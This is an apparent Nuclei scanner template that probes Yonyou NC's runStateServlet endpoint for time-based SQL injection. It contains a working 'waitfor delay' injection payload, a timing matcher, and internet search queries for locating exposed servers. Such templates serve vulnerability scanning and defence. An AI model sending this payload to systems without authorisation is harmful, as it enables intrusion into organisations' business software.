id: Yonyou_NC_runStateServlet_SQLi

info:
  name: Yonyou_NC_runStateServlet_SQLi
  author: HK
  severity: high 
  description: 用友NC/portal/pt/servlet/runStateServlet接口存在SQL注入漏洞
  metadata:
    max-request: 1
    Fofa-query: body="../Client/Uclient/UClient.dmg"
    Hunter-query: body="../Client/Uclient/UClient.dmg"
    Quake-query: body="../Client/Uclient/UClient.dmg"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:4'-- HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    Content-Type: application/x-www-form-urlencoded

  redirects: true
  matchers-condition: and
  matchers:
    - type: dsl
      dsl:
        - 'duration >= 4'